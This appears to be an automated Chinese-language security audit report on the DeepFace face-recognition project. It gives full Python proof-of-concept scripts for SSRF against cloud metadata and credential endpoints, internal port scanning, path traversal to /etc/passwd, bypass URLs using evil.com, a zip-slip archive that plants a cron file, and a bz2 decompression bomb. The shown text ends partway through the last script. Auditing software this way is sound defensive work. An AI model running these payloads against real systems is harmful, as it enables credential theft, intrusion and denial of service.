# CodeSentinel 安全审计报告

## 项目信息
- **项目名称:** deepface
- **编程语言:** {"Python": 100.0}
- **文件数量:** 105
- **审计时间:** 2026-07-12 03:42:39

## 执行摘要

本次安全审计针对开源项目DeepFace（https://github.com/serengil/deepface）进行，该项目是一个基于Python的人脸识别框架，包含105个文件，共计19479行代码。审计发现多个高危漏洞，包括服务器端请求伪造（SSRF）、路径遍历、信息泄露以及不安全的文件解压等。这些漏洞可能导致内部网络探测、敏感文件读取、云服务凭证泄露以及远程代码执行等严重后果。建议开发团队立即修复高危漏洞，并加强输入验证和异常处理机制。

**风险评分:** 85/100

## 漏洞统计

| 严重等级 | 数量 |
|---------|------|
| Critical | 3 |
| High | 4 |
| Medium | 3 |
| Low | 2 |
| **总计** | **12** |

## 漏洞详情

### VULN-8728F6F5 - SSRF (Server-Side Request Forgery)

- **严重等级:** HIGH
- **文件位置:** `deepface/api/src/modules/core/routes.py:42`
- **数据流:** 用户通过JSON或表单提交的img参数 -> extract_image_from_request函数返回 -> 传递给service.represent/verify/analyze/register等函数 -> 这些函数可能将img作为URL传递给requests库或文件读取函数
- **判断理由:** extract_image_from_request函数接受用户提供的img参数，可以是base64编码、文件路径或URL。该值直接传递给下游服务函数，如果服务函数使用该值作为URL发起网络请求，攻击者可以构造恶意URL指向内部服务（如http://localhost:6379/）或云元数据端点（如http://169.254.169.254/），导致SSRF攻击。

**代码片段:**
```
str_img: str = cast(str, input_args.get(img_key))
...
return str_img
```

**PoC代码:**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSRF PoC for DeepFace API - 仅供研究使用
"""

import requests
import json

# 目标API地址
TARGET_URL = "http://target-deepface-api:5000"

# PoC 1: 探测内部Redis服务 (端口6379)
def poc_redis_ssrf():
    """
    利用SSRF探测内部Redis服务
    """
    payload = {
        "img": "http://localhost:6379/"
    }
    headers = {"Content-Type": "application/json"}
    
    # 尝试represent端点
    response = requests.post(
        f"{TARGET_URL}/represent",
        json=payload,
        headers=headers
    )
    print(f"[PoC 1] Redis探测响应: {response.status_code}")
    print(f"响应内容: {response.text[:500]}")
    return response

# PoC 2: 探测云元数据端点 (AWS)
def poc_aws_metadata():
    """
    利用SSRF获取AWS云元数据
    """
    payload = {
        "img": "http://169.254.169.254/latest/meta-data/"
    }
    headers = {"Content-Type": "application/json"}
    
    response = requests.post(
        f"{TARGET_URL}/represent",
        json=payload,
        headers=headers
    )
    print(f"[PoC 2] AWS元数据探测响应: {response.status_code}")
    print(f"响应内容: {response.text[:500]}")
    return response

# PoC 3: 探测内部HTTP服务
def poc_internal_http():
    """
    利用SSRF探测内部HTTP服务 (如内部管理面板)
    """
    payload = {
        "img": "http://127.0.0.1:8080/admin"
    }
    headers = {"Content-Type": "application/json"}
    
    response = requests.post(
        f"{TARGET_URL}/verify",
        json={"img1": payload["img"], "img2": "http://example.com/test.jpg"},
        headers=headers
    )
    print(f"[PoC 3] 内部HTTP探测响应: {response.status_code}")
    print(f"响应内容: {response.text[:500]}")
    return response

# PoC 4: 文件读取尝试 (如果支持file://协议)
def poc_file_read():
    """
    尝试读取本地敏感文件 (如果底层支持file://协议)
    """
    payload = {
        "img": "file:///etc/passwd"
    }
    headers = {"Content-Type": "application/json"}
    
    response = requests.post(
        f"{TARGET_URL}/analyze",
        json=payload,
        headers=headers
    )
    print(f"[PoC 4] 文件读取探测响应: {response.status_code}")
    print(f"响应内容: {response.text[:500]}")
    return response

if __name__ == "__main__":
    print("=" * 60)
    print("DeepFace API SSRF漏洞PoC - 仅供研究使用")
    print("=" * 60)
    
    # 执行PoC
    poc_redis_ssrf()
    print("\n" + "-" * 40 + "\n")
    poc_aws_metadata()
    print("\n" + "-" * 40 + "\n")
    poc_internal_http()
    print("\n" + "-" * 40 + "\n")
    poc_file_read()
```

---

### VULN-F62E5C7A - 路径遍历 (Path Traversal)

- **严重等级:** HIGH
- **文件位置:** `deepface/api/src/modules/core/routes.py:42`
- **数据流:** 用户通过JSON或表单提交的img参数 -> extract_image_from_request函数返回 -> 传递给service.represent/verify/analyze/register等函数 -> 这些函数可能将img作为文件路径传递给open()或类似函数
- **判断理由:** extract_image_from_request函数接受用户提供的img参数，可以是文件路径。该值未经过任何路径规范化或白名单校验，直接传递给下游服务函数。如果服务函数使用该值作为文件路径读取文件，攻击者可以构造类似'../../etc/passwd'的路径读取任意系统文件。

**代码片段:**
```
str_img: str = cast(str, input_args.get(img_key))
...
return str_img
```

**PoC代码:**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DeepFace API 路径遍历漏洞 PoC
仅供安全研究使用，请勿用于非法用途
"""

import requests
import json
import sys

# 目标API地址，请替换为实际地址
TARGET_URL = "http://localhost:5000"

def poc_path_traversal_read_file(file_path):
    """
    利用路径遍历漏洞读取任意文件
    
    Args:
        file_path: 要读取的文件路径，如 '../../etc/passwd'
    """
    # 使用 /represent 端点进行利用
    endpoint = f"{TARGET_URL}/represent"
    
    # 构造恶意payload
    payload = {
        "img": file_path,
        "model_name": "VGG-Face",
        "detector_backend": "opencv",
        "enforce_detection": False,
        "align": True
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        print(f"[+] 尝试读取文件: {file_path}")
        response = requests.post(endpoint, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] 请求成功，状态码: {response.status_code}")
            print(f"[+] 响应内容:\n{json.dumps(response.json(), indent=2)}")
        elif response.status_code == 400:
            print(f"[!] 请求被拒绝，状态码: {response.status_code}")
            print(f"[!] 错误信息: {response.text}")
        else:
            print(f"[!] 未知状态码: {response.status_code}")
            print(f"[!] 响应内容: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] 无法连接到目标: {TARGET_URL}")
    except Exception as e:
        print(f"[-] 发生错误: {str(e)}")

def poc_path_traversal_verify(file_path1, file_path2):
    """
    利用 /verify 端点进行路径遍历
    """
    endpoint = f"{TARGET_URL}/verify"
    
    payload = {
        "img1": file_path1,
        "img2": file_path2,
        "model_name": "VGG-Face",
        "detector_backend": "opencv",
        "enforce_detection": False,
        "align": True
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        print(f"[+] 尝试读取文件1: {file_path1}")
        print(f"[+] 尝试读取文件2: {file_path2}")
        response = requests.post(endpoint, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] 请求成功，状态码: {response.status_code}")
            print(f"[+] 响应内容:\n{json.dumps(response.json(), indent=2)}")
        else:
            print(f"[!] 状态码: {response.status_code}")
            print(f"[!] 响应内容: {response.text}")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] 无法连接到目标: {TARGET_URL}")
    except Exception as e:
        print(f"[-] 发生错误: {str(e)}")

if __name__ == "__main__":
    print("=" * 60)
    print("DeepFace API 路径遍历漏洞 PoC")
    print("漏洞ID: VULN-F62E5C7A")
    print("仅供安全研究使用")
    print("=" * 60)
    
    # 测试读取 /etc/passwd
    poc_path_traversal_read_file("../../etc/passwd")
    
    print("\n" + "-" * 60)
    
    # 测试读取 /etc/hostname
    poc_path_traversal_read_file("../../etc/hostname")
    
    print("\n" + "-" * 60)
    
    # 测试 /verify 端点
    poc_path_traversal_verify("../../etc/passwd", "../../etc/hostname")
```

---

### VULN-29A6D1D6 - 信息泄露 - 异常信息返回

- **严重等级:** LOW
- **文件位置:** `deepface/api/src/modules/core/routes.py:63`
- **数据流:** 用户输入 -> extract_image_from_request函数抛出异常 -> 异常信息直接返回给用户
- **判断理由:** 多个路由处理函数（represent、verify、analyze、register）在捕获异常时直接将异常信息返回给客户端。这可能导致敏感信息泄露，如文件路径、数据库结构、内部实现细节等，有助于攻击者进一步攻击。

**代码片段:**
```
except Exception as err:
    return {"exception": str(err)}, 400
```

**PoC代码:**
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC代码 - 仅供安全研究使用
漏洞：DeepFace API 异常信息泄露
"""

import requests
import json

# 目标API地址（请替换为实际测试地址）
TARGET_URL = "http://localhost:5000"

def test_represent_exception():
    """
    测试 /represent 路由的异常信息泄露
    通过发送无效的JSON请求触发异常
    """
    print("[*] 测试 /represent 路由异常信息泄露...")
    
    # 构造恶意请求：缺少必要字段 'img'
    payload = {
        "model_name": "VGG-Face",
        "detector_backend": "opencv"
        # 故意不提供 'img' 字段
    }
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer test_token"  # 假设需要认证
    }
    
    try:
        response = requests.post(
            f"{TARGET_URL}/represent",
            json=payload,
            headers=headers
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容: {response.text}")
        
        # 检查是否泄露了异常信息
        if "exception" in response.json():
            print(f"[!] 发现异常信息泄露: {response.json()['exception']}")
            return True
        else:
            print("[-] 未发现异常信息泄露")
            return False
            
    except Exception as e:
        print(f"[-] 请求失败: {str(e)}")
        return False

def test_verify_exception():
    """
    测试 /verify 路由的异常信息泄露
    通过发送空文件触发异常
    """
    print("\n[*] 测试 /verify 路由异常信息泄露...")
    
    # 构造包含空文件名的请求
    files = {
        "img1": ("", b"", "image/jpeg"),  # 空文件名
        "img2": ("test.jpg", b"fake_image_data", "image/jpeg")
    }
    
    headers = {
        "Authorization": "Bearer test_token"
    }
    
    try:
        response = requests.post(
            f"{TARGET_URL}/verify",
            files=files,
            headers=headers
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容: {response.text}")
        
        if "exception" in response.json():
            print(f"[!] 发现异常信息泄露: {response.json()['exception']}")
            return True
        else:
            print("[-] 未发现异常信息泄露")
            return False
            
    except Exception as e:
        print(f"[-] 请求失败: {str(e)}")
        return False

def test_analyze_exception():
    """
    测试 /analyze 路由的异常信息泄露
    通过发送无效的base64数据触发异常
    """
    print("\n[*] 测试 /analyze 路由异常信息泄露...")
    
    # 构造包含无效base64数据的请求
    payload = {
        "img": "invalid_base64_data!!!",  # 无效的base64字符串
        "detector_backend": "opencv"
    }
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer test_token"
    }
    
    try:
        response = requests.post(
            f"{TARGET_URL}/analyze",
            json=payload,
            headers=headers
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容: {response.text}")
        
        if "exception" in response.json():
            print(f"[!] 发现异常信息泄露: {response.json()['exception']}")
            return True
        else:
            print("[-] 未发现异常信息泄露")
            return False
            
    except Exception as e:
        print(f"[-] 请求失败: {str(e)}")
        return False

def test_register_exception():
    """
    测试 /register 路由的异常信息泄露
    通过发送无效的URL触发异常
    """
    print("\n[*] 测试 /register 路由异常信息泄露...")
    
    # 构造包含无效URL的请求
    payload = {
        "img": "http://nonexistent-domain-123456.com/image.jpg",  # 不存在的URL
        "subject": "test_user"
    }
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer test_token"
    }
    
    try:
        response = requests.post(
            f"{TARGET_URL}/register",
            json=payload,
            headers=headers
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容: {response.text}")
        
        if "exception" in response.json():
            print(f"[!] 发现异常信息泄露: {response.json()['exception']}")
            return True
        else:
            print("[-] 未发现异常信息泄露")
            return False
            
    except Exception as e:
        print(f"[-] 请求失败: {str(e)}")
        return False

if __name__ == "__main__":
    print("=" * 60)
    print("DeepFace API 异常信息泄露 PoC")
    print("仅供安全研究使用 - 请勿用于非法用途")
    print("=" * 60)
    
    # 执行所有测试
    results = []
    results.append(test_represent_exception())
    results.append(test_verify_exception())
    results.append(test_analyze_exception())
    results.append(test_register_exception())
    
    print("\n" + "=" * 60)
    print("测试结果汇总:")
    for i, result in enumerate(results):
        status = "[+] 存在漏洞" if result else "[-] 未发现漏洞"
        print(f"  测试 {i+1}: {status}")
    print("=" * 60)
```

---

### VULN-A2298577 - 信息泄露 - 异常信息泄露

- **严重等级:** MEDIUM
- **文件位置:** `deepface/api/src/modules/core/service.py:33`
- **数据流:** 异常对象(err)和traceback字符串(tb_str)被直接拼接到HTTP响应中返回给客户端
- **判断理由:** 所有异常处理函数(represent, verify, analyze, register, search, build_index)都将完整的异常信息和traceback堆栈信息返回给客户端。这可能导致敏感信息泄露，如文件路径、数据库结构、内部API调用细节等，攻击者可以利用这些信息进行进一步攻击。

**代码片段:**
```
return {"error": f"Exception while representing: {str(err)} - {tb_str}"}, 400
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
DeepFace API 异常信息泄露漏洞 PoC
仅供安全研究使用 - 请勿用于非法用途
"""

import requests
import sys
import json

# 目标API基础URL
BASE_URL = "http://localhost:5000"  # 请根据实际部署修改

def poc_represent_exception():
    """
    利用represent接口触发异常，获取堆栈信息
    通过传入无效的文件路径触发异常
    """
    print("[*] 测试 represent 接口异常信息泄露...")
    
    # 构造恶意请求 - 使用不存在的文件路径
    payload = {
        "img_path": "/etc/passwd",  # 尝试读取系统文件
        "model_name": "Facenet",
        "detector_backend": "opencv",
        "enforce_detection": True,
        "align": True,
        "anti_spoofing": False
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/represent",
            json=payload,
            timeout=10
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容:\n{json.dumps(response.json(), indent=2)}")
        
        # 检查是否泄露了敏感信息
        if "error" in response.json():
            error_msg = response.json()["error"]
            if "Traceback" in error_msg or "File" in error_msg or "/" in error_msg:
                print("[!] 发现敏感信息泄露!")
                print(f"[!] 泄露的异常信息包含文件路径和堆栈跟踪")
                return True
                
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    return False

def poc_verify_exception():
    """
    利用verify接口触发异常
    通过传入无效的图像数据触发
    """
    print("\n[*] 测试 verify 接口异常信息泄露...")
    
    # 构造恶意请求 - 使用无效的base64图像数据
    payload = {
        "img1_path": "data:image/png;base64,invalid_data_here",
        "img2_path": "data:image/png;base64,also_invalid",
        "model_name": "Facenet",
        "detector_backend": "opencv",
        "distance_metric": "cosine",
        "enforce_detection": True,
        "align": True,
        "anti_spoofing": False
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/verify",
            json=payload,
            timeout=10
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容:\n{json.dumps(response.json(), indent=2)}")
        
        if "error" in response.json():
            error_msg = response.json()["error"]
            if "Traceback" in error_msg or "File" in error_msg:
                print("[!] 发现敏感信息泄露!")
                return True
                
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    return False

def poc_analyze_exception():
    """
    利用analyze接口触发异常
    通过传入超大图像或无效参数触发
    """
    print("\n[*] 测试 analyze 接口异常信息泄露...")
    
    # 构造恶意请求 - 使用无效的detector_backend
    payload = {
        "img_path": "https://example.com/nonexistent.jpg",
        "actions": ["age", "gender"],
        "detector_backend": "invalid_backend_name",
        "enforce_detection": True,
        "align": True,
        "anti_spoofing": False
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/analyze",
            json=payload,
            timeout=10
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容:\n{json.dumps(response.json(), indent=2)}")
        
        if "error" in response.json():
            error_msg = response.json()["error"]
            if "Traceback" in error_msg or "File" in error_msg:
                print("[!] 发现敏感信息泄露!")
                return True
                
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    return False

def poc_register_exception():
    """
    利用register接口触发异常
    通过传入无效的数据库连接信息触发
    """
    print("\n[*] 测试 register 接口异常信息泄露...")
    
    # 构造恶意请求 - 使用无效的数据库类型
    payload = {
        "img": "path/to/nonexistent/image.jpg",
        "model_name": "Facenet",
        "detector_backend": "opencv",
        "enforce_detection": True,
        "align": True,
        "l2_normalize": True,
        "expand_percentage": 0,
        "normalization": "base",
        "anti_spoofing": False,
        "img_name": "test.jpg",
        "database_type": "invalid_database",
        "connection_details": "{}"
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/register",
            json=payload,
            timeout=10
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容:\n{json.dumps(response.json(), indent=2)}")
        
        if "error" in response.json():
            error_msg = response.json()["error"]
            if "Traceback" in error_msg or "File" in error_msg:
                print("[!] 发现敏感信息泄露!")
                return True
                
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    return False

def poc_search_exception():
    """
    利用search接口触发异常
    通过传入无效的搜索参数触发
    """
    print("\n[*] 测试 search 接口异常信息泄露...")
    
    # 构造恶意请求 - 使用无效的搜索方法
    payload = {
        "img": "path/to/nonexistent/image.jpg",
        "model_name": "Facenet",
        "detector_backend": "opencv",
        "distance_metric": "cosine",
        "enforce_detection": True,
        "align": True,
        "l2_normalize": True,
        "expand_percentage": 0,
        "normalization": "base",
        "anti_spoofing": False,
        "similarity_search": False,
        "k": 5,
        "database_type": "invalid",
        "connection_details": "{}",
        "search_method": "invalid_method"
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/search",
            json=payload,
            timeout=10
        )
        
        print(f"[+] 响应状态码: {response.status_code}")
        print(f"[+] 响应内容:\n{json.dumps(response.json(), indent=2)}")
        
        if "error" in response.json():
            error_msg = response.json()["error"]
            if "Traceback" in error_msg or "File" in error_msg:
                print("[!] 发现敏感信息泄露!")
                return True
                
    except Exception as e:
        print(f"[-] 请求失败: {e}")
    
    return False

def main():
    """
    主函数 - 执行所有PoC测试
    """
    print("=" * 60)
    print("DeepFace API 异常信息泄露漏洞 PoC")
    print("漏洞ID: VULN-A2298577")
    print("仅供安全研究使用 - 请勿用于非法用途")
    print("=" * 60)
    
    # 检查目标是否可达
    try:
        response = requests.get(f"{BASE_URL}/", timeout=5)
        print(f"[+] 目标可达，状态码: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"[-] 无法连接到 {BASE_URL}")
        print("[*] 请确保DeepFace API服务正在运行")
        sys.exit(1)
    
    # 执行所有测试
    results = []
    results.append(poc_represent_exception())
    results.append(poc_verify_exception())
    results.append(poc_analyze_exception())
    results.append(poc_register_exception())
    results.append(poc_search_exception())
    
    # 输出总结
    print("\n" + "=" * 60)
    print("测试结果总结:")
    print("=" * 60)
    
    endpoints = ["represent", "verify", "analyze", "register", "search"]
    for i, (endpoint, result) in enumerate(zip(endpoints, results)):
        status = "[!] 存在信息泄露" if result else "[+] 未检测到泄露"
        print(f"  {endpoint}: {status}")
    
    if any(results):
        print("\n[!] 漏洞确认: 多个API端点存在异常信息泄露")
        print("[!] 泄露的信息可能包含:")
        print("    - 服务器文件系统路径")
        print("    - 内部API调用细节")
        print("    - 数据库结构信息")
        print("    - 第三方库版本信息")
        print("    - 堆栈跟踪中的敏感数据")
    else:
        print("\n[+] 未检测到信息泄露，可能已修复")

if __name__ == "__main__":
    main()
```

---

### VULN-7FDF8B86 - SSRF (服务端请求伪造)

- **严重等级:** HIGH
- **文件位置:** `deepface/commons/image_utils.py:131`
- **数据流:** 用户输入img -> load_image函数 -> 检测到URL前缀 -> 调用load_image_from_web(url=img) -> requests.get(url, stream=True, timeout=60) -> 直接请求用户提供的URL
- **判断理由:** load_image函数接受用户输入的字符串，当字符串以http://或https://开头时，会直接发起网络请求。攻击者可以构造恶意URL（如内网地址http://169.254.169.254/、file://协议等）来发起SSRF攻击，探测内网服务或访问敏感资源。虽然代码中限制了http/https前缀，但未对URL进行任何校验或白名单过滤，存在被利用的风险。

**代码片段:**
```
if img.lower().startswith(("http://", "https://")):
    return load_image_from_web(url=img), img
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
SSRF PoC for DeepFace - VULN-7FDF8B86
仅供研究使用 - For Research Purposes Only
"""

import requests
import sys

# ============================================================
# PoC 1: 探测云元数据服务 (AWS/GCP/Azure)
# ============================================================
def poc_cloud_metadata():
    """
    利用SSRF访问云服务元数据端点
    目标: 探测内网敏感信息
    """
    print("[*] PoC 1: 探测云元数据服务")
    print("[*] 仅供研究使用 - For Research Purposes Only\n")
    
    # 构造恶意URL - 指向云元数据服务
    # AWS: http://169.254.169.254/latest/meta-data/
    # GCP: http://metadata.google.internal/computeMetadata/v1/
    # Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
    
    target_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    ]
    
    for url in target_urls:
        print(f"[+] 尝试访问: {url}")
        try:
            # 模拟DeepFace内部调用: load_image_from_web(url=img)
            # 实际代码中会调用 requests.get(url, stream=True, timeout=60)
            response = requests.get(
                url,
                stream=True,
                timeout=5,
                headers={"Metadata-Flavor": "Google"}  # GCP需要此header
            )
            if response.status_code == 200:
                print(f"[!] 成功! 响应内容 (前500字节):")
                print(response.text[:500])
                print("-" * 50)
            else:
                print(f"[-] 状态码: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[-] 连接失败: {e}")
        print()


# ============================================================
# PoC 2: 内网端口扫描
# ============================================================
def poc_internal_port_scan():
    """
    利用SSRF扫描内网服务
    目标: 发现内网开放端口
    """
    print("[*] PoC 2: 内网端口扫描")
    print("[*] 仅供研究使用 - For Research Purposes Only\n")
    
    # 常见内网地址和端口
    internal_targets = [
        ("http://127.0.0.1", [80, 443, 8080, 5000, 3000, 6379, 3306, 27017]),
        ("http://localhost", [80, 443, 8080, 5000]),
        ("http://10.0.0.1", [80, 443, 8080]),
        ("http://172.16.0.1", [80, 443, 8080]),
        ("http://192.168.1.1", [80, 443, 8080]),
    ]
    
    for base_url, ports in internal_targets:
        for port in ports:
            url = f"{base_url}:{port}"
            print(f"[+] 探测: {url}")
            try:
                response = requests.get(url, stream=True, timeout=3)
                if response.status_code < 400:
                    print(f"[!] 发现服务: {url} - 状态码: {response.status_code}")
                else:
                    print(f"[-] 状态码: {response.status_code}")
            except requests.exceptions.RequestException:
                print(f"[-] 端口关闭或超时")
            print()


# ============================================================
# PoC 3: 利用file://协议读取本地文件 (如果存在协议绕过)
# ============================================================
def poc_file_protocol():
    """
    测试file://协议是否可被利用
    注意: 原代码限制了http/https, 但可能存在绕过
    """
    print("[*] PoC 3: 测试协议绕过")
    print("[*] 仅供研究使用 - For Research Purposes Only\n")
    
    # 尝试可能的绕过方式
    bypass_urls = [
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "http://127.0.0.1:80@evil.com",  # URL混淆
        "http://evil.com#@127.0.0.1",    # 片段绕过
        "http://evil.com%2f@127.0.0.1",  # URL编码绕过
    ]
    
    for url in bypass_urls:
        print(f"[+] 测试: {url}")
        try:
            response = requests.get(url, stream=True, timeout=5)
            print(f"[!] 响应状态码: {response.status_code}")
            if response.status_code == 200:
                print(f"[!] 响应内容 (前200字节): {response.text[:200]}")
        except requests.exceptions.RequestException as e:
            print(f"[-] 错误: {e}")
        print()


# ============================================================
# PoC 4: 模拟DeepFace API调用 (完整利用链)
# ============================================================
def poc_deepface_api_call():
    """
    模拟通过DeepFace API触发SSRF
    假设DeepFace暴露了接受图片URL的API端点
    """
    print("[*] PoC 4: 模拟DeepFace API调用")
    print("[*] 仅供研究使用 - For Research Purposes Only\n")
    
    # 假设的API端点 (需要根据实际部署调整)
    api_endpoint = "http://target-deepface-server:5000/analyze"
    
    # 构造恶意请求
    malicious_payload = {
        "img": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "actions": ["age", "gender", "emotion"]
    }
    
    print(f"[+] 目标API: {api_endpoint}")
    print(f"[+] 恶意payload: {malicious_payload}")
    print()
    
    try:
        response = requests.post(
            api_endpoint,
            json=malicious_payload,
            timeout=10
        )
        print(f"[!] API响应状态码: {response.status_code}")
        print(f"[!] 响应内容: {response.text[:1000]}")
    except requests.exceptions.RequestException as e:
        print(f"[-] API请求失败: {e}")
        print("[*] 注意: 此PoC需要实际运行的DeepFace服务")


if __name__ == "__main__":
    print("=" * 60)
    print("DeepFace SSRF漏洞 PoC (VULN-7FDF8B86)")
    print("仅供研究使用 - For Research Purposes Only")
    print("=" * 60)
    print()
    
    # 执行PoC
    poc_cloud_metadata()
    poc_internal_port_scan()
    poc_file_protocol()
    poc_deepface_api_call()
    
    print("=" * 60)
    print("PoC执行完毕")
    print("警告: 此代码仅用于安全研究, 请勿用于非法用途")
    print("=" * 60)
```

---

### VULN-F7A34AE2 - 不安全的文件解压

- **严重等级:** HIGH
- **文件位置:** `deepface/commons/weight_utils.py:68`
- **数据流:** 从外部下载的zip文件被解压到本地目录，未对zip文件内容进行安全检查
- **判断理由:** 使用zipfile.extractall()存在zip滑洞攻击风险。恶意构造的zip文件可能包含符号链接或路径遍历文件名，导致文件被解压到预期目录之外。应使用extract()方法并验证每个文件的路径

**代码片段:**
```
with zipfile.ZipFile(f"{target_file}.zip", "r") as zip_ref:
    zip_ref.extractall(os.path.join(home, ".deepface/weights"))
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 不安全的文件解压 - Zip滑洞攻击
仅供安全研究使用
"""

import zipfile
import os
import tempfile

# 模拟目标解压目录
TARGET_DIR = os.path.expanduser("~/.deepface/weights")

# 创建恶意zip文件
malicious_zip_path = "/tmp/malicious.zip"

# 构造路径遍历文件名
# 利用 '../' 跳出目标目录
malicious_files = [
    # 写入到 /tmp/evil.txt
    {"name": "../../tmp/evil.txt", "content": b"Malicious file content\n"},
    # 写入到 ~/evil_config.ini
    {"name": "../../evil_config.ini", "content": b"[malicious]\nkey=value\n"},
    # 尝试覆盖系统文件（仅演示路径遍历）
    {"name": "../../etc/cron.d/evil", "content": b"* * * * * root echo pwned\n"},
]

# 创建恶意zip文件
with zipfile.ZipFile(malicious_zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
    for file_info in malicious_files:
        # 使用路径遍历名称写入zip
        zf.writestr(file_info["name"], file_info["content"])
        print(f"[+] 添加恶意文件: {file_info['name']}")

print(f"\n[+] 恶意zip文件已创建: {malicious_zip_path}")
print(f"[+] 文件内容:")
with zipfile.ZipFile(malicious_zip_path, "r") as zf:
    for name in zf.namelist():
        print(f"    - {name}")

# 模拟漏洞利用：使用extractall解压
print(f"\n[*] 模拟解压到 {TARGET_DIR}...")
print(f"[*] 如果代码使用 extractall() 且无路径检查，文件将被解压到目标目录之外")

# 实际解压演示（仅在/tmp下进行，避免破坏系统）
print("\n[*] 实际解压演示（安全环境）:")
demo_dir = tempfile.mkdtemp(prefix="zip_poc_demo_")
print(f"[*] 解压到临时目录: {demo_dir}")

# 模拟漏洞代码
with zipfile.ZipFile(malicious_zip_path, "r") as zip_ref:
    zip_ref.extractall(demo_dir)

# 检查文件是否被解压到预期目录之外
print("\n[*] 检查文件位置:")
for file_info in malicious_files:
    expected_path = os.path.normpath(os.path.join(demo_dir, file_info["name"]))
    if os.path.exists(expected_path):
        print(f"[!] 文件被解压到预期路径: {expected_path}")
    else:
        # 路径遍历生效，文件在目标目录之外
        actual_path = os.path.normpath(os.path.join(demo_dir, "../../tmp/evil.txt"))
        if os.path.exists(actual_path):
            print(f"[!] 路径遍历成功！文件实际位置: {actual_path}")
        else:
            print(f"[-] 文件未找到: {expected_path}")

# 清理
print("\n[*] 清理临时文件...")
import shutil
shutil.rmtree(demo_dir, ignore_errors=True)
os.remove(malicious_zip_path)
print("[+] 清理完成")

print("\n=== 漏洞利用总结 ===")
print("1. 攻击者构造包含路径遍历文件名的zip文件")
print("2. 通过中间人攻击或篡改下载源替换合法zip")
print("3. 调用extractall()时，文件被解压到目标目录之外")
print("4. 可能导致任意文件写入、覆盖或执行")
print("\n修复建议: 使用extract()并验证每个文件的路径是否在目标目录内")
```

---

### VULN-9F7FAE97 - 不安全的文件解压

- **严重等级:** MEDIUM
- **文件位置:** `deepface/commons/weight_utils.py:71`
- **数据流:** 从外部下载的bz2文件被解压到本地文件系统
- **判断理由:** 未对解压后的数据大小进行限制，恶意构造的bz2文件可能导致zip炸弹攻击，消耗大量内存和磁盘空间。应添加解压大小限制

**代码片段:**
```
bz2file = bz2.BZ2File(f"{target_file}.bz2")
data = bz2file.read()
with open(target_file, "wb") as f:
    f.write(data)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 不安全的文件解压 - BZ2炸弹攻击
漏洞ID: VULN-9F7FAE97
仅供安全研究使用
"""

import bz2
import os
import sys

# ============================================
# 第一部分：生成恶意BZ2文件（压缩炸弹）
# ============================================

def create_bz2_bomb(output_path: str, target_size_gb: int = 10) -> str:
    """
    生成一个BZ2压缩炸弹文件
    
    原理：利用BZ2压缩算法，构造高度可压缩的数据模式
    使得解压后数据量远大于压缩包大小
    
    Args:
        output_path: 输出文件路径
        target_size_gb: 解压后目标大小（GB）
    
    Returns:
        生成的BZ2文件路径
    """
    print(f"[!] 生成BZ2炸弹文件，解压后目标大小: {target_size_gb}GB")
    
    # 构造高度可压缩的数据（全零字节）
    # BZ2对重复数据有极高的压缩比
    chunk_size = 1024 * 1024  # 1MB
    total_chunks = target_size_gb * 1024  # 转换为MB
    
    bz2_file_path = output_path + ".bz2"
    
    with bz2.BZ2File(bz2_file_path, 'wb', compresslevel=9) as bz2_file:
        for i in range(total_chunks):
            # 写入全零数据块
            bz2_file.write(b'\x00' * chunk_size)
            
            if (i + 1) % 100 == 0:
                progress = (i + 1) / total_chunks * 100
                print(f"   进度: {progress:.1f}% ({i+1}/{total_chunks} MB)")
    
    # 获取文件大小
    actual_size = os.path.getsize(bz2_file_path)
    print(f"[+] BZ2炸弹文件已生成: {bz2_file_path}")
    print(f"    压缩包大小: {actual_size / 1024 / 1024:.2f} MB")
    print(f"    解压后理论大小: {target_size_gb} GB")
    print(f"    压缩比: {target_size_gb * 1024 / (actual_size / 1024 / 1024):.0f}:1")
    
    return bz2_file_path


# ============================================
# 第二部分：模拟漏洞利用过程
# ============================================

def simulate_exploit(bz2_file_path: str) -> None:
    """
